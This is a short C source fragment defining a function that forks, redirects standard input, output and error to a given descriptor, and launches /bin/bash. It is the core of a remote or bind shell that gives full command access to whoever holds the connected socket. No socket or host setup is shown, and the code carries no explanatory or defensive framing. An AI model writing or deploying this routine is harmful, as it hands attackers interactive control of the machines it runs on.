#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <wait.h>
#include <pwd.h>
#include <sys/types.h>

int shell(int s){
    if(fork() == 0){
        dup2(s, STDIN_FILENO);
        dup2(s, STDOUT_FILENO);
        dup2(s, STDERR_FILENO);
        if(execl("/bin/bash", "/bin/bash", NULL) != EOF)
            return EXIT_SUCCESS;
    }
    return EOF;
}
